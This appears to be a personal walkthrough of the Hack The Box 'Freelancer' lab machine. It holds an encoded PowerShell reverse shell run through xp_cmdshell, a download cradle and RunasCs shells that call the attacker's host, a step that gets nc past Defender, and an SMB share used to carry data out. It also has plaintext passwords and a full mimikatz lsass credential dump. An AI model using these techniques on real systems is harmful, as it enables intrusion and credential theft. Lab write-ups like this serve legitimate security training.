EXEC xp_cmdshell 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMwAiACwANQA1ADUANQApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA='
```

But the straight commando isn't working so I will try to download a shell directly from my Python HTTPm server instead so we can see if commando works or not!

```
EXECUTE AS LOGIN = 'sa'
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
EXEC SP_CONFIGURE 'show advanced options',1
reconfigure
EXEC SP_CONFIGURE 'xp_cmdshell',1
reconfigure
EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString("http://10.10.14.3/shell.ps1") | powershell -noprofile'
```

After several tests seems like only curl is available on the machine, no certutil.exe or whatsoverver.

![792df9ee561c5f22935d977242626a1a.png](../../../_resources/792df9ee561c5f22935d977242626a1a.png)

![7f4e861b55f9259a6570acad8803dc60.png](../../../_resources/7f4e861b55f9259a6570acad8803dc60.png)

Knowing this might be usefull to execute the shell! But this isn't enough so i guess we can upload nc.exe and procede from there!

![fd2f724b3eab8075ad3468dbfa4100b3.png](../../../_resources/fd2f724b3eab8075ad3468dbfa4100b3.png)

And the nc.exe as well.

![8170a630cb869c6bd4d8fef5c8456d55.png](../../../_resources/8170a630cb869c6bd4d8fef5c8456d55.png)

We can confirm in the python http server!

```
┌──(root㉿DESKTOP-1KSM320)-[/home/aleksandar/Downloads/Freelancer]
└─# python3 -m http.server 80                                                                                                                                                                                                                              
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.5 - - [04/Jun/2024 13:55:04] "GET /shell.ps1 HTTP/1.1" 200 -
10.10.11.5 - - [04/Jun/2024 13:56:07] "GET /nc.exe HTTP/1.1" 200 -
```

Now we should be able to invoke the shell via saved file under C:\\Temp\\

![5f4b16b7a424abc6f92782487c9fa286.png](../../../_resources/5f4b16b7a424abc6f92782487c9fa286.png)

But the powershell isn't working so let's try to use the nc.exe instead in the same folder.

![308359c3314315b769f1f848301559a5.png](../../../_resources/308359c3314315b769f1f848301559a5.png)

But seems like the defenfer is blocking nc.exe so let's look around for a safe version anyway! This seems like a good candidate since the defender isn't complainign abour it!

```
https://github.com/int0x33/nc.exe/blob/master/nc64.exe
```

After so many tests I had to reset the machine cause I wasn't catching back a shell session!

&nbsp;

# Attempt #2

This time I am doing the same test but on the Kali linux machine and not from the WSL(ofter gives me headaches with reverse shells and so on..)

And this time I am doing the same, but using the n64.exe as it is supposed to bypass the Firewall check, plus I am using the Release Arena connection to get a fresh session only for me!

![5a1c7fe6d057404a29f5b899f12c9207.png](../../../_resources/5a1c7fe6d057404a29f5b899f12c9207.png)

And magically it worked like a charm! But the session seems killing after a minute so I will try to invoke a new shell from the shell itself!

Now we can see that we have a wobbly shell! Damn! But at the second attempt now it seems wokring after I spawned the shell via start-process instead!

![957564745d91d4711f5c104f5a761f1a.png](../../../_resources/957564745d91d4711f5c104f5a761f1a.png)

And looking around seems like we can find the svc_sql credentials saved in the home folder SQL config files:

```
C:\Users\sql_svc\Downloads\SQLEXPR-2019_x64_ENU>type sql-Configuration.INI
type sql-Configuration.INI
[OPTIONS]
ACTION="Install"
QUIET="True"
FEATURES=SQL
INSTANCENAME="SQLEXPRESS"
INSTANCEID="SQLEXPRESS"
RSSVCACCOUNT="NT Service\ReportServer$SQLEXPRESS"
AGTSVCACCOUNT="NT AUTHORITY\NETWORK SERVICE"
AGTSVCSTARTUPTYPE="Manual"
COMMFABRICPORT="0"
COMMFABRICNETWORKLEVEL=""0"
COMMFABRICENCRYPTION="0"
MATRIXCMBRICKCOMMPORT="0"
SQLSVCSTARTUPTYPE="Automatic"
FILESTREAMLEVEL="0"
ENABLERANU="False" 
SQLCOLLATION="SQL_Latin1_General_CP1_CI_AS"
SQLSVCACCOUNT="FREELANCER\sql_svc"
SQLSVCPASSWORD="IL0v3ErenY3ager"
SQLSYSADMINACCOUNTS="FREELANCER\Administrator"
SECURITYMODE="SQL"
SAPWD="t3mp0r@ryS@PWD"
ADDCURRENTUSERASSQLADMIN="False"
TCPENABLED="1"
NPENABLED="1"
BROWSERSVCSTARTUPTYPE="Automatic"
IAcceptSQLServerLicenseTerms=True

C:\Users\sql_svc\Downloads\SQLEXPR-2019_x64_ENU>
```

Except that I can see that the sql_svc isn't holding any strange permissions so far!

```
C:\Users>whoami /all
whoami /all

USER INFORMATION
----------------

User Name          SID                                           
================== ==============================================
freelancer\sql_svc S-1-5-21-3542429192-2036945976-3483670807-1114


GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                                             Attributes                                        
========================================== ================ =============================================================== ==================================================
Everyone                                   Well-known group S-1-1-0                                                         Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                                    Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                                    Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\SERVICE                       Well-known group S-1-5-6                                                         Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                              Well-known group S-1-2-1                                                         Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                                        Mandatory group, Enabled by default, Enabled group
NT SERVICE\MSSQL$SQLEXPRESS                Well-known group S-1-5-80-3880006512-4290199581-1648723128-3569869737-3631323133 Enabled by default, Enabled group, Group owner    
LOCAL                                      Well-known group S-1-2-0                                                         Mandatory group, Enabled by default, Enabled group
Authentication authority asserted identity Well-known group S-1-18-1                                                        Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288                                                                                                      


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State   
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
SeCreateGlobalPrivilege       Create global objects          Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```

But seems like the creds are not letting me get access via Winrm, but going back we can find the SA credentials as well.

Checking from the available users we have a bunch of them..

```
C:\Users>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 8954-28AE

 Directory of C:\Users

05/28/2024  10:19 AM    <DIR>          .
05/28/2024  10:19 AM    <DIR>          ..
06/04/2024  03:17 PM    <DIR>          Administrator
05/28/2024  10:23 AM    <DIR>          lkazanof
05/28/2024  10:23 AM    <DIR>          lorra199
05/28/2024  10:22 AM    <DIR>          mikasaAckerman
08/27/2023  01:16 AM    <DIR>          MSSQLSERVER
06/04/2024  05:27 PM    <DIR>          Public
05/28/2024  10:22 AM    <DIR>          sqlbackupoperator
05/28/2024  11:16 AM    <DIR>          sql_svc
               0 File(s)              0 bytes
              10 Dir(s)   1,901,666,304 bytes free
```

next checking from the inside seems like the Freelancer web stuff is loaded from C:\\apps where offcourse we have no access!

```
C:\nginx\sites-enabled>type freelancer.conf
type freelancer.conf
limit_req_zone $binary_remote_addr zone=mylimit:10m rate=50r/s;
server {
    listen      80;
    server_name freelancer.htb;
    charset     utf-8;
    gzip on;
    gzip_types text/plain text/css application/json application/javascript text/xml application/xml application/xml+rss text/javascript;
    gzip_proxied any;
    gzip_vary on;

    location /static/ {
    	limit_req zone=mylimit burst=30;
        alias C:/apps/freelancer/freelancer/static/;
    }

    location / {
    	limit_req zone=mylimit burst=30;
        proxy_pass http://localhost:8000;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
```

I will check for installed software as well.

![192e687e2aa95a9a153d3a69e388adb5.png](../../../_resources/192e687e2aa95a9a153d3a69e388adb5.png)

Now what about on the Program Files x86? SAME shit!

Now since I don't see that much going on, I suspect that password we found saved in the MSSQL installation folder might be re-used for some of the others usernames maybe?

Seems like the SQL_SVC old password is re-used for the account named "MickasaAckerman"

```
C:\temp>RunasCs.exe mikasaAckerman IL0v3ErenY3ager "cmd /c whoami /all"
RunasCs.exe mikasaAckerman IL0v3ErenY3ager "cmd /c whoami /all"


USER INFORMATION
----------------

User Name                 SID                                           
========================= ==============================================
freelancer\mikasaackerman S-1-5-21-3542429192-2036945976-3483670807-1105


GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes                                        
========================================== ================ ============ ==================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE                   Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                              Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192                                                    


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State   
============================= ============================== ========
SeMachineAccountPrivilege     Add workstations to domain     Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```

Before invoking a new shell via RunAScs.exe I will check if I can gain access directly via WIN-RM?

![c9024deab254c1271508323c717b8a2b.png](../../../_resources/c9024deab254c1271508323c717b8a2b.png)

It doesn't work, so I guess we need to use the CMD.exe redirect via RunAsCs.exe!

```
RunasCs.exe mikasaAckerman IL0v3ErenY3ager powershell.exe -r 10.10.14.46:4477
```

![a9c15a4f6528c686f8790f9f0280185d.png](../../../_resources/a9c15a4f6528c686f8790f9f0280185d.png)

&nbsp;

# Road to USER.txt

Now that we have a new shell as Mickasa we need to check what permission the user holds?

![49936ee5dd70b829bb4d4239131aade2.png](../../../_resources/49936ee5dd70b829bb4d4239131aade2.png)

No juicy permissions or groups. We can move on and maybe check what can we find in his user folder?

```
PS C:\users\mikasaAckerman\Desktop> ls
ls


    Directory: C:\users\mikasaAckerman\Desktop


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----       10/28/2023   6:23 PM           1468 mail.txt                                                              
-a----        10/4/2023   1:47 PM      292692678 MEMORY.7z                                                             
-ar---         6/4/2024   3:17 PM             34 user.txt                                                              


PS C:\users\mikasaAckerman\Desktop> cat user.txt
cat user.txt
9399942150a639526a5599210b9872ce
PS C:\users\mikasaAckerman\Desktop>
```

Nice our first flag! But I see a mail and what it might be a memory dump maybe?

# Road to ROOT.txt

&nbsp;Now let's start by reading the email..

![bcecc9cb31061acf54e85d7665f811d1.png](../../../_resources/bcecc9cb31061acf54e85d7665f811d1.png)

Indeed the 7zip archive is a memory dump that we need to analyze somehow... I think I need to download it locally for analyzing...

Looking on LolBas we can see that CMD should be able to upload a file overwebdav?

https://lolbas-project.github.io/lolbas/Binaries/Cmd/#upload

So we can setup a temp samba server on our machine:

![329939b28aab005ced2655e04d30c589.png](../../../_resources/329939b28aab005ced2655e04d30c589.png)

Next we should be able to upload? NO!

So I will map a new share to a U: disk:

```
PS C:\users\mikasaAckerman\Desktop> net use u: \\10.10.14.46\yovecio /user:yovecio yovecio
net use u: \\10.10.14.46\yovecio /user:yovecio yovecio
The command completed successfully.


PS C:\users\mikasaAckerman\Desktop>
```

![ef6ed843066fe2db5c73d355bda4bbfb.png](../../../_resources/ef6ed843066fe2db5c73d355bda4bbfb.png)

Now we need to copy files over to the share

![35bf3b66062c77eab644f56a5a38f0a1.png](../../../_resources/35bf3b66062c77eab644f56a5a38f0a1.png)

![ed205f7b2776829e3d69ce1cc0f84c1f.png](../../../_resources/ed205f7b2776829e3d69ce1cc0f84c1f.png)

Now the archive itself contains a dmp file which is the default dump file that can be archived during as BSOD(aka crash) and can be analyzed either with default windows debugger, aka WinDBG or Volatility or even Autopsy.

After a quick test seems like neither WinDBG nor Autopsy gave me back something out of it, which means we need to parse the file via Volatility instead!

I will start with Volatility from Linux..

![60cf482357fed0ad9c8750683efa6463.png](../../../_resources/60cf482357fed0ad9c8750683efa6463.png)

Now everything I test it is failing, damn it! I might test to load the dmp and dump it via mimikatz from windows?

Apparently this is the way to go: https://diverto.hr/en/blog/en-2019-11-05-Extracting-Passwords-from-hiberfil-and-memdumps/

But It keeps failing on symbols so I got a tips to use the ProcMemFS which mounts a dmp to a FS instead.  And it keeps failng!

&nbsp;

# Back on track

Next I got tips that I can dump the LSASS.exe by loading the dmp file via Widbg.

Load the file in WIndbg windows and under Setting -> Debugging Settings -> Symbol Path

```
srv*
```

This will ensure to download the path when needed. Next we load the file and we can click analyze -v to perform the analysys.

![7a03fd66055d09e185ef52fb88f2e426.png](../../../_resources/7a03fd66055d09e185ef52fb88f2e426.png)

And now we need to load the mimilib.dll from mimikatz in order to be able to dump the lsas.exe

.load PATH/TO/MIMILIB.DLL

![8d95e863612a1f3f3411c7d07e565f2c.png](../../../_resources/8d95e863612a1f3f3411c7d07e565f2c.png)

And now we should be able to dump lsass via:

```
1: kd> !process 0 0 lsass.exe
PROCESS ffffbc83a93e7080
    SessionId: 0  Cid: 0248    Peb: c4fb6df000  ParentCid: 01c8
    DirBase: 0cfd2002  ObjectTable: ffffd3067d89ab00  HandleCount: 1051.
    Image: lsass.exe
```

We need to choose the process id from the previous step:

![5d429b75e14ba2014b44c6c7d1be11e5.png](../../../_resources/5d429b75e14ba2014b44c6c7d1be11e5.png)

And this will do the job!

```
1: kd> !mimikatz

DPAPI Backup keys
=================
Current prefered key:       {00000000-0000-0000-0000-000000000000}
Compatibility prefered key: {00000000-0000-0000-0000-000000000000}

DPAPI System
============
full: cf1bc407d272ade7e781f17f6f3a3fc2b82d16bc6d210ab98889fac8829a1526a5d6a2f76f8f9d53
m/u : cf1bc407d272ade7e781f17f6f3a3fc2b82d16bc / 6d210ab98889fac8829a1526a5d6a2f76f8f9d53

SekurLSA
========

Authentication Id : 0 ; 45311 (00000000:0000b0ff)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : 
Logon Time        : 2023-10-04 19:30:10
SID               : S-1-5-90-0-1
    msv : 
     [00000003] Primary
     * Username : DATACENTER-2019$
     * Domain   : FREELANCER
     * NTLM     : 1003ddfa0a470017188b719e1eaae709
     * SHA1     : 4ce0bf0f488248a0858d1eacbe75529994ba4999
    tspkg : KO
    wdigest : 
     * Username : DATACENTER-2019$
     * Domain   : FREELANCER
     * Password : (null)
    kerberos : 
     * Username : DATACENTER-2019$
     * Domain   : freelancer.htb
     * Password : a6 80 a4 af 30 e0 45 06 64 19 c6 f5 2c 07 3d 73 82 41 fa 9d 1c ff 59 1b 95 15 35 cf f5 32 0b 10 9e 65 22 0c 1c 9e 4f a8 91 c9 d1 ee 22 e9 90 c4 76 6b 3e b6 3f b3 e2 da 67 eb d1 98 30 d4 5c 0b a4 e6 e6 df 93 18 0c 0a 74 49 75 06 55 ed d7 8e b8 48 f7 57 68 9a 68 89 f3 f8 f7 f6 cf 53 e1 19 6a 52 8a 7c d1 05 a2 ec ce fb 2a 17 ae 5a eb f8 49 02 e3 26 6b bc 5d b6 e3 71 62 7b b0 82 8c 2a 36 4c b0 11 19 cf 3d 2c 70 d9 20 32 8c 81 4c ad 07 f2 b5 16 14 3d 86 d0 e8 8e f1 50 40 67 81 5e d7 0e 9c cb 86 1f 57 39 4d 94 ba 9f 77 19 8e 9d 76 ec ad f8 cd b1 af da 48 b8 1f 81 d8 4a c6 25 30 38 9c b6 4d 41 2b 78 4f 0f 73 35 51 a6 2e c0 86 2a c2 fb 26 1b 43 d7 99 90 d4 e2 bf bf 4d 7d 4e eb 90 cc d7 dc 9b 48 20 28 c2 14 3c 5a 60 10 
     * Key List
       aes256_hmac       9cc4c2603a3ed67348ee18025dc10cdea94e9427fc4f6e02fca57f1eb89dead7
       aes128_hmac       e2166c1e1a5f29f378c4751039869624
       rc4_hmac_nt       1003ddfa0a470017188b719e1eaae709
       rc4_hmac_old      1003ddfa0a470017188b719e1eaae709
       rc4_md4           1003ddfa0a470017188b719e1eaae709
       rc4_hmac_nt_exp   1003ddfa0a470017188b719e1eaae709
       rc4_hmac_old_exp  1003ddfa0a470017188b719e1eaae709

    ssp : 
    masterkey : 
    credman : 

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : DATACENTER-2019$
Domain            : FREELANCER
Logon Server      : 
Logon Time        : 2023-10-04 19:30:09
SID               : S-1-5-20
    msv : 
     [00000003] Primary
     * Username : DATACENTER-2019$
     * Domain   : FREELANCER
     * NTLM     : 1003ddfa0a470017188b719e1eaae709
     * SHA1     : 4ce0bf0f488248a0858d1eacbe75529994ba4999
    tspkg : KO
    wdigest : 
     * Username : DATACENTER-2019$
     * Domain   : FREELANCER
     * Password : (null)
    kerberos : 
     * Username : datacenter-2019$
     * Domain   : FREELANCER.HTB
     * Password : (null)
     * Key List
       aes256_hmac       6e4859faf9de3d1de33fdd2a0bb4591306b5d64f0d8ec2de342d49cf470cbc1f
       rc4_hmac_nt       1003ddfa0a470017188b719e1eaae709
       rc4_hmac_old      1003ddfa0a470017188b719e1eaae709
       rc4_md4           1003ddfa0a470017188b719e1eaae709
       rc4_hmac_nt_exp   1003ddfa0a470017188b719e1eaae709
       rc4_hmac_old_exp  1003ddfa0a470017188b719e1eaae709

    ssp : 
    masterkey : 
    credman : 

Authentication Id : 0 ; 27279 (00000000:00006a8f)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : 
Logon Time        : 2023-10-04 19:30:08
SID               : S-1-5-96-0-1
    msv : 
     [00000003] Primary
     * Username : DATACENTER-2019$
     * Domain   : FREELANCER
     * NTLM     : 1003ddfa0a470017188b719e1eaae709
     * SHA1     : 4ce0bf0f488248a0858d1eacbe75529994ba4999
    tspkg : KO
    wdigest : 
     * Username : DATACENTER-2019$
     * Domain   : FREELANCER
     * Password : (null)
    kerberos : 
     * Username : DATACENTER-2019$
     * Domain   : freelancer.htb
     * Password : a6 80 a4 af 30 e0 45 06 64 19 c6 f5 2c 07 3d 73 82 41 fa 9d 1c ff 59 1b 95 15 35 cf f5 32 0b 10 9e 65 22 0c 1c 9e 4f a8 91 c9 d1 ee 22 e9 90 c4 76 6b 3e b6 3f b3 e2 da 67 eb d1 98 30 d4 5c 0b a4 e6 e6 df 93 18 0c 0a 74 49 75 06 55 ed d7 8e b8 48 f7 57 68 9a 68 89 f3 f8 f7 f6 cf 53 e1 19 6a 52 8a 7c d1 05 a2 ec ce fb 2a 17 ae 5a eb f8 49 02 e3 26 6b bc 5d b6 e3 71 62 7b b0 82 8c 2a 36 4c b0 11 19 cf 3d 2c 70 d9 20 32 8c 81 4c ad 07 f2 b5 16 14 3d 86 d0 e8 8e f1 50 40 67 81 5e d7 0e 9c cb 86 1f 57 39 4d 94 ba 9f 77 19 8e 9d 76 ec ad f8 cd b1 af da 48 b8 1f 81 d8 4a c6 25 30 38 9c b6 4d 41 2b 78 4f 0f 73 35 51 a6 2e c0 86 2a c2 fb 26 1b 43 d7 99 90 d4 e2 bf bf 4d 7d 4e eb 90 cc d7 dc 9b 48 20 28 c2 14 3c 5a 60 10 
     * Key List
       aes256_hmac       9cc4c2603a3ed67348ee18025dc10cdea94e9427fc4f6e02fca57f1eb89dead7
       aes128_hmac       e2166c1e1a5f29f378c4751039869624
       rc4_hmac_nt       1003ddfa0a470017188b719e1eaae709
       rc4_hmac_old      1003ddfa0a470017188b719e1eaae709
       rc4_md4           1003ddfa0a470017188b719e1eaae709
       rc4_hmac_nt_exp   1003ddfa0a470017188b719e1eaae709
       rc4_hmac_old_exp  1003ddfa0a470017188b719e1eaae709

    ssp : 
    masterkey : 
    credman : 

Authentication Id : 0 ; 27269 (00000000:00006a85)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : 
Logon Time        : 2023-10-04 19:30:08
SID               : S-1-5-96-0-0
    msv : 
     [00000003] Primary
     * Username : DATACENTER-2019$
     * Domain   : FREELANCER
     * NTLM     : 1003ddfa0a470017188b719e1eaae709
     * SHA1     : 4ce0bf0f488248a0858d1eacbe75529994ba4999
    tspkg : KO
    wdigest : 
     * Username : DATACENTER-2019$
     * Domain   : FREELANCER
     * Password : (null)
    kerberos : 
     * Username : DATACENTER-2019$
     * Domain   : freelancer.htb
     * Password : a6 80 a4 af 30 e0 45 06 64 19 c6 f5 2c 07 3d 73 82 41 fa 9d 1c ff 59 1b 95 15 35 cf f5 32 0b 10 9e 65 22 0c 1c 9e 4f a8 91 c9 d1 ee 22 e9 90 c4 76 6b 3e b6 3f b3 e2 da 67 eb d1 98 30 d4 5c 0b a4 e6 e6 df 93 18 0c 0a 74 49 75 06 55 ed d7 8e b8 48 f7 57 68 9a 68 89 f3 f8 f7 f6 cf 53 e1 19 6a 52 8a 7c d1 05 a2 ec ce fb 2a 17 ae 5a eb f8 49 02 e3 26 6b bc 5d b6 e3 71 62 7b b0 82 8c 2a 36 4c b0 11 19 cf 3d 2c 70 d9 20 32 8c 81 4c ad 07 f2 b5 16 14 3d 86 d0 e8 8e f1 50 40 67 81 5e d7 0e 9c cb 86 1f 57 39 4d 94 ba 9f 77 19 8e 9d 76 ec ad f8 cd b1 af da 48 b8 1f 81 d8 4a c6 25 30 38 9c b6 4d 41 2b 78 4f 0f 73 35 51 a6 2e c0 86 2a c2 fb 26 1b 43 d7 99 90 d4 e2 bf bf 4d 7d 4e eb 90 cc d7 dc 9b 48 20 28 c2 14 3c 5a 60 10 
     * Key List
       aes256_hmac       9cc4c2603a3ed67348ee18025dc10cdea94e9427fc4f6e02fca57f1eb89dead7
       aes128_hmac       e2166c1e1a5f29f378c4751039869624
       rc4_hmac_nt       1003ddfa0a470017188b719e1eaae709
       rc4_hmac_old      1003ddfa0a470017188b719e1eaae709
       rc4_md4           1003ddfa0a470017188b719e1eaae709
       rc4_hmac_nt_exp   1003ddfa0a470017188b719e1eaae709
       rc4_hmac_old_exp  1003ddfa0a470017188b719e1eaae709

    ssp : 
    masterkey : 
    credman : 

Authentication Id : 0 ; 429726 (00000000:00068e9e)
Session           : CachedInteractive from 1
User Name         : Administrator
Domain            : FREELANCER
Logon Server      : DC
Logon Time        : 2023-10-04 19:32:52
SID               : S-1-5-21-3542429192-2036945976-3483670807-500
    msv : 
     [00000003] Primary
     * Username : Administrator
     * Domain   : FREELANCER
     * NTLM     : acb3617b6b9da5dc7778092bdea6f3b8
     * SHA1     : ccbee099f360c2fd26b8a3953d9b37893bcaa467
     * DPAPI    : 587f524a5c66053caa5e00000000acb3
    tspkg : KO
    wdigest : 
     * Username : Administrator
     * Domain   : FREELANCER
     * Password : (null)
    kerberos : 
     * Username : Administrator
     * Domain   : FREELANCER.HTB
     * Password : v3ryS0l!dP@sswd#29
     * Key List
       aes256_hmac       707d2a08632dec5b412a8a77d52b24004c301b694ef640630a5f7141d71b7969
       aes128_hmac       bce0bf149aded161c203a597fcbefcb5
       rc4_hmac_nt       acb3617b6b9da5dc7778092bdea6f3b8
       rc4_hmac_old      acb3617b6b9da5dc7778092bdea6f3b8
       rc4_md4           acb3617b6b9da5dc7778092bdea6f3b8
       rc4_hmac_nt_exp   acb3617b6b9da5dc7778092bdea6f3b8
       rc4_hmac_old_exp  acb3617b6b9da5dc7778092bdea6f3b8

    ssp : 
    masterkey : 
    credman : 

Authentication Id : 0 ; 181266 (00000000:0002c412)
Session           : Interactive from 1
User Name         : liza.kazanof
Domain            : FREELANCER
Logon Server      : DC
Logon Time        : 2023-10-04 19:31:23
SID               : S-1-5-21-3542429192-2036945976-3483670807-1121
    msv : 
     [00000003] Primary
     * Username : liza.kazanof
     * Domain   : FREELANCER
     * NTLM     : 6bc05d2a5ebf34f5b563ff233199dc5a
     * SHA1     : 93eff904639f3b40b0f05f9052c48473ecd2757e
     * DPAPI    : 953b826b646b373f4972000000006bc0
    tspkg : KO
    wdigest : 
     * Username : liza.kazanof
     * Domain   : FREELANCER
     * Password : (null)
    kerberos : 
     * Username : liza.kazanof
     * Domain   : FREELANCER.HTB
     * Password : (null)
     * Key List
       aes256_hmac       8dd82890a73d1e0aee90290425edff274a46b331908637c5b49b636408c5f4b1
       rc4_hmac_nt       6bc05d2a5ebf34f5b563ff233199dc5a
       rc4_hmac_old      6bc05d2a5ebf34f5b563ff233199dc5a
       rc4_md4           6bc05d2a5ebf34f5b563ff233199dc5a
       rc4_hmac_nt_exp   6bc05d2a5ebf34f5b563ff233199dc5a
       rc4_hmac_old_exp  6bc05d2a5ebf34f5b563ff233199dc5a

    ssp : 
    masterkey : 
     [00000000]
     * GUID      :	{b3859cd0-59d2-4857-8a5f-98d469e5d8d2}
     * Time      :	2023-10-04 17:31:41
     * MasterKey :	e88b706951f959a337fdf1a4d2eb5c61505435464ebdf135eb33105155da02279ca34659ac5892fe35302fa8695a35e0db93fdfa08f08b18d4e30f2db01e2e38
    credman : 

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : 
Logon Time        : 2023-10-04 19:30:12
SID               : S-1-5-19
    msv : 
    tspkg : KO
    wdigest : 
     * Username : (null)
     * Domain   : (null)
     * Password : (null)
    kerberos : 
     * Username : (null)
     * Domain   : (null)
     * Password : (null)
    ssp : 
    masterkey : 
    credman : 

Authentication Id : 0 ; 45365 (00000000:0000b135)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : 
Logon Time        : 2023-10-04 19:30:10
SID               : S-1-5-90-0-1
    msv : 
     [00000003] Primary
     * Username : DATACENTER-2019$
     * Domain   : FREELANCER
     * NTLM     : 1003ddfa0a470017188b719e1eaae709
     * SHA1     : 4ce0bf0f488248a0858d1eacbe75529994ba4999
    tspkg : KO
    wdigest : 
     * Username : DATACENTER-2019$
     * Domain   : FREELANCER
     * Password : (null)
    kerberos : 
     * Username : DATACENTER-2019$
     * Domain   : freelancer.htb
